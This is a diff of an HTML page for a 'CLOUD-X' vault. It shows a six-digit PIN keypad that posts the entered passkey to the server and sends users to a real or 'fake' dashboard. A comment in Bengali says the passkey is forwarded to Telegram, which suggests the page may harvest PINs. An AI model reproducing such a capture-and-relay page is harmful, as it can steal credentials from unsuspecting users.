@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>CLOUD-X | Security Passkey</title>
+    <title>CLOUD-X | Security Verification</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
@@ -13,8 +13,10 @@
             --border-glow: rgba(0, 210, 255, 0.35);
             --primary: #00d2ff;
             --primary-glow: rgba(0, 210, 255, 0.5);
+            --accent: #3a7bd5;
             --text-main: #ffffff;
             --text-muted: #8a9bb8;
+            --success: #00ff88;
             --error: #ff4757;
         }
 
@@ -29,202 +31,274 @@
         body {
             background-color: var(--bg-deep);
             color: var(--text-main);
-            min-height: 100vh;
+            height: 100vh;
+            width: 100vw;
             display: flex;
+            flex-direction: column;
+            justify-content: space-between;
             align-items: center;
-            justify-content: center;
-            padding: 16px;
             overflow: hidden;
+            position: fixed;
+            padding: 10px 16px;
         }
 
         .ambient-glow {
-            position: fixed;
+            position: absolute;
             width: 100%;
             height: 100%;
             top: 0;
             left: 0;
-            background: radial-gradient(circle at 50% 50%, rgba(0, 210, 255, 0.06) 0%, transparent 60%);
+            background: 
+                radial-gradient(circle at 20% 20%, rgba(0, 210, 255, 0.08) 0%, transparent 40%),
+                radial-gradient(circle at 80% 80%, rgba(58, 123, 213, 0.08) 0%, transparent 40%);
             z-index: -2;
         }
 
-        .passkey-card {
-            background: var(--surface);
-            backdrop-filter: blur(25px);
+        .cyber-grid {
+            position: absolute;
             width: 100%;
-            max-width: 380px;
-            padding: 30px 20px;
-            border-radius: 20px;
-            border: 1px solid var(--border-glow);
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6);
-            text-align: center;
+            height: 100%;
+            background-image: linear-gradient(rgba(255, 255, 255, 0.015) 1px, transparent 1px),
+                              linear-gradient(90deg, rgba(255, 255, 255, 0.015) 1px, transparent 1px);
+            background-size: 40px 40px;
+            z-index: -1;
         }
 
-        .lock-icon {
-            font-size: 32px;
+        .header-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+            max-width: 380px;
+        }
+
+        .logo-area {
+            font-size: 18px;
+            font-weight: 700;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+        }
+
+        .logo-area span {
             color: var(--primary);
-            margin-bottom: 12px;
             text-shadow: 0 0 15px var(--primary-glow);
         }
 
+        .server-status {
+            font-size: 9.5px;
+            font-weight: 600;
+            color: var(--success);
+            background: rgba(0, 255, 136, 0.06);
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            padding: 4px 8px;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .blink-dot {
+            width: 5px;
+            height: 5px;
+            background-color: var(--success);
+            border-radius: 50%;
+            box-shadow: 0 0 6px var(--success);
+        }
+
+        .card {
+            background: var(--surface);
+            backdrop-filter: blur(25px);
+            padding: 18px;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.8), 0 0 0 1px var(--border-glow);
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+        }
+
         h2 {
-            font-size: 18px;
+            font-size: 16px;
             font-weight: 700;
             margin-bottom: 6px;
+            color: var(--text-main);
         }
 
-        p {
-            font-size: 12px;
+        .subtitle {
+            font-size: 10px;
             color: var(--text-muted);
-            margin-bottom: 25px;
+            margin-bottom: 16px;
         }
 
-        /* 6 Dot indicators */
-        .dots-container {
+        /* Passkey Dots Display (6 Digits) */
+        .passkey-display {
             display: flex;
             justify-content: center;
-            gap: 12px;
-            margin-bottom: 30px;
+            gap: 10px;
+            margin-bottom: 18px;
         }
 
-        .dot {
-            width: 14px;
-            height: 14px;
+        .passkey-dot {
+            width: 10px;
+            height: 10px;
             border-radius: 50%;
-            border: 2px solid var(--border-glow);
+            border: 2px solid var(--primary);
             background: rgba(3, 5, 8, 0.5);
-            transition: 0.2s ease;
+            transition: 0.3s ease;
         }
 
-        .dot.active {
+        .passkey-dot.active {
             background: var(--primary);
-            border-color: var(--primary);
-            box-shadow: 0 0 10px var(--primary-glow);
+            box-shadow: 0 0 10px var(--primary);
         }
 
-        /* Numpad 0-9 */
-        .numpad {
+        /* Modern Keypad Grid */
+        .keypad {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
-            gap: 15px;
+            gap: 10px;
             max-width: 260px;
             margin: 0 auto;
         }
 
-        .num-btn {
+        .key-btn {
             background: rgba(255, 255, 255, 0.03);
-            border: 1px solid rgba(255, 255, 255,5, 0.08);
+            border: 1px solid rgba(255, 255, 255, 0.08);
             color: var(--text-main);
-            font-size: 20px;
-            font-weight: 600;
-            height: 55px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            font-size: 18px;
+            font-weight: 700;
+            padding: 12px 0;
+            border-radius: 14px;
             cursor: pointer;
-            transition: 0.2s;
+            transition: all 0.2s ease;
+            backdrop-filter: blur(10px);
         }
 
-        .num-btn:active {
+        .key-btn:active {
             background: var(--primary);
             color: #000;
+            transform: scale(0.95);
             box-shadow: 0 0 15px var(--primary-glow);
         }
 
-        .num-btn.clear {
-            font-size: 14px;
-            color: var(--error);
-            border-color: rgba(255, 71, 87, 0.3);
+        .key-btn.action {
+            font-size: 13px;
+            color: var(--text-muted);
         }
 
-        .num-btn.zero {
-            grid-column: 2;
+        .footer-container {
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+            font-size: 9.5px;
+            color: var(--text-muted);
         }
     </style>
 </head>
 <body>
 
     <div class="ambient-glow"></div>
+    <div class="cyber-grid"></div>
 
-    <div class="passkey-card">
-        <div class="lock-icon"><i class="fa-solid fa-shield-halved"></i></div>
-        <h2>Vault Passkey Required</h2>
-        <p>Enter your 6-digit security passkey to proceed</p>
+    <div class="header-top">
+        <div class="logo-area">CLOUD <span>X</span></div>
+        <div class="server-status">
+            <div class="blink-dot"></div>
+            SECURE VAULT
+        </div>
+    </div>
 
-        <div class="dots-container" id="dotsContainer">
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
+    <div class="card">
+        <h2>ENTER PASSKEY</h2>
+        <div class="subtitle">Enter your 6-digit security PIN code</div>
+
+        <!-- Visual Dots (6 Digits) -->
+        <div class="passkey-display">
+            <div class="passkey-dot" id="dot-0"></div>
+            <div class="passkey-dot" id="dot-1"></div>
+            <div class="passkey-dot" id="dot-2"></div>
+            <div class="passkey-dot" id="dot-3"></div>
+            <div class="passkey-dot" id="dot-4"></div>
+            <div class="passkey-dot" id="dot-5"></div>
         </div>
 
-        <div class="numpad">
-            <button class="num-btn" onclick="pressNum('1')">1</button>
-            <button class="num-btn" onclick="pressNum('2')">2</button>
-            <button class="num-btn" onclick="pressNum('3')">3</button>
-            <button class="num-btn" onclick="pressNum('4')">4</button>
-            <button class="num-btn" onclick="pressNum('5')">5</button>
-            <button class="num-btn" onclick="pressNum('6')">6</button>
-            <button class="num-btn" onclick="pressNum('7')">7</button>
-            <button class="num-btn" onclick="pressNum('8')">8</button>
-            <button class="num-btn" onclick="pressNum('9')">9</button>
-            <button class="num-btn clear" onclick="clearPasskey()">C</button>
-            <button class="num-btn zero" onclick="pressNum('0')">0</button>
+        <!-- Keypad -->
+        <div class="keypad">
+            <button class="key-btn" onclick="pressKey('1')">1</button>
+            <button class="key-btn" onclick="pressKey('2')">2</button>
+            <button class="key-btn" onclick="pressKey('3')">3</button>
+            <button class="key-btn" onclick="pressKey('4')">4</button>
+            <button class="key-btn" onclick="pressKey('5')">5</button>
+            <button class="key-btn" onclick="pressKey('6')">6</button>
+            <button class="key-btn" onclick="pressKey('7')">7</button>
+            <button class="key-btn" onclick="pressKey('8')">8</button>
+            <button class="key-btn" onclick="pressKey('9')">9</button>
+            <button class="key-btn action" onclick="clearKey()"><i class="fa-solid fa-rotate-left"></i></button>
+            <button class="key-btn" onclick="pressKey('0')">0</button>
+            <button class="key-btn action" onclick="deleteKey()"><i class="fa-solid fa-delete-left"></i></button>
         </div>
+    </div>
+
+    <div class="footer-container">
+        Protected by <span>Cloud-X Secure Enclave</span>
     </div>
 
     <script>
         let currentPasskey = "";
+        const maxLength = 6; // ৬ ডিজিট সেট করা হয়েছে
 
-        function pressNum(num) {
-            if (currentPasskey.length < 6) {
+        function pressKey(num) {
+            if (currentPasskey.length < maxLength) {
                 currentPasskey += num;
-                updateDots();
+                updateDisplay();
 
-                if (currentPasskey.length === 6) {
-                    verifyPasskey();
+                if (currentPasskey.length === maxLength) {
+                    submitPasskey();
                 }
             }
         }
 
-        function clearPasskey() {
-            currentPasskey = "";
-            updateDots();
+        function deleteKey() {
+            currentPasskey = currentPasskey.slice(0, -1);
+            updateDisplay();
         }
 
-        function updateDots() {
-            const dots = document.querySelectorAll('.dot');
-            dots.forEach((dot, index) => {
-                if (index < currentPasskey.length) {
+        function clearKey() {
+            currentPasskey = "";
+            updateDisplay();
+        }
+
+        function updateDisplay() {
+            for (let i = 0; i < maxLength; i++) {
+                const dot = document.getElementById(`dot-${i}`);
+                if (i < currentPasskey.length) {
                     dot.classList.add('active');
                 } else {
                     dot.classList.remove('active');
                 }
-            });
+            }
         }
 
-        function verifyPasskey() {
+        function submitPasskey() {
+            // পাসকি টেলিগ্রামে পাঠানোর জন্য ফেচ রিকোয়েস্ট পাঠানো হচ্ছে
             fetch('/verify-passkey', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                headers: {
+                    'Content-Type': 'application/json'
+                },
                 body: JSON.stringify({ passkey: currentPasskey })
             })
             .then(res => res.json())
             .then(data => {
-                if (data.status === 'real') {
-                    window.location.href = '/dashboard';
-                } else if (data.status === 'fake') {
-                    window.location.href = '/fake-dashboard';
+                // সঠিক হলে আসল ড্যাশবোর্ড, ভুল বা ফেক হলে ফেক ড্যাশবোর্ডে রিডাইরেক্ট হবে
+                if (data.status === 'success') {
+                    window.location.href = '/dashboard.html';
                 } else {
-                    alert('Invalid Passkey! Try again.');
-                    clearPasskey();
+                    window.location.href = '/fake-dashboard.html';
                 }
             })
             .catch(err => {
-                console.error(err);
-                clearPasskey();
+                console.error('Error:', err);
+                window.location.href = '/fake-dashboard.html';
             });
         }
     </script>
